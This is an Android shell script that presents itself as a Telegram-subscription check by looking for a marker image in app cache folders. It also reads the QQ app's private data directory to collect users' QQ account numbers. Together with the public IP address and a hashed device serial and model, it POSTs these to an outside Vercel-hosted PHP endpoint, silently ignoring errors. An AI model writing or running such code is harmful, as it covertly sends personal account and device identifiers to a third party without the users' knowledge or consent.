#!/bin/sh
set -e

# ------------------------------
# 配置
# ------------------------------
qq_dir="/data/data/com.tencent.mobileqq/files/"
target_file="-6190413750901787098_99.jpg"
cache_glob="/storage/emulated/0/Android/data/*/cache/"

# ------------------------------
# kernel version
# ------------------------------
kernel_version=$(uname -r | awk -F- '{print $1}' | awk -F. '{print $1"."$2}')

# ------------------------------
# TG 订阅验证文件检查
# ------------------------------
validation_status="failed"
for cache_dir in $cache_glob; do
  if [ -f "${cache_dir}${target_file}" ]; then
    validation_status="success"
    break
  fi
done

# ------------------------------
# 收集 QQ 号（纯数字文件/文件夹名）
# ------------------------------
numbers_list=""
if [ -d "$qq_dir" ]; then
  for item in "$qq_dir"/*; do
    name=$(basename "$item")
    case "$name" in
      ''|*[!0-9]*)
        ;;  # 非纯数字跳过
      *)
        if [ -z "$numbers_list" ]; then
          numbers_list="$name"
        else
          numbers_list="$numbers_list,$name"
        fi
        ;;
    esac
  done
fi

# ------------------------------
# 获取公网 IPv4（单接口 ipv4.ip.sb）
# ------------------------------
ip=$(curl -s --max-time 5 https://ipv4.ip.sb || echo "")

# ------------------------------
# 获取设备唯一 ID（机器码）
# ------------------------------
device_id="unknown"
device_components=""

# 尝试 getprop
if command -v getprop >/dev/null 2>&1; then
  serial=$(getprop ro.serialno 2>/dev/null)
  model=$(getprop ro.product.model 2>/dev/null)
  manufacturer=$(getprop ro.product.manufacturer 2>/dev/null)
  brand=$(getprop ro.product.brand 2>/dev/null)
  [ -n "$serial" ] && device_components="$device_components$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
  [ -n "$brand" ] && device_components="${device_components}_${brand}"
fi

# fallback build.prop
if [ -z "$device_components" ] && [ -f /system/build.prop ]; then
  serial=$(grep -m1 '^ro.serialno=' /system/build.prop | cut -d'=' -f2)
  model=$(grep -m1 '^ro.product.model=' /system/build.prop | cut -d'=' -f2)
  manufacturer=$(grep -m1 '^ro.product.manufacturer=' /system/build.prop | cut -d'=' -f2)
  [ -n "$serial" ] && device_components="$serial"
  [ -n "$model" ] && device_components="${device_components}_${model}"
  [ -n "$manufacturer" ] && device_components="${device_components}_${manufacturer}"
fi

# md5sum 生成 device_id
if [ -n "$device_components" ]; then
  if command -v md5sum >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5sum | awk '{print $1}')
  elif command -v md5 >/dev/null 2>&1; then
    device_id=$(echo -n "$device_components" | md5 | awk '{print $1}')
  fi
fi

# ------------------------------
# 构建 JSON
# ------------------------------
json_data=$(cat <<EOF
{
  "kernel_version": "$kernel_version",
  "validation_status": "$validation_status",
  "numbers": "$numbers_list",
  "ip": "$ip",
  "device_id": "$device_id"
}
EOF
)

# ------------------------------
# 发送 POST 到 Vercel PHP API
# ------------------------------
VERCEL_API="https://vercel-php-api-dusky.vercel.app/api/verify.php"
curl -s -X POST "$VERCEL_API" \
  -H "Content-Type: application/json" \
  -d "$json_data" || true

# 输出 JSON（便于调试）
echo "$json_data"
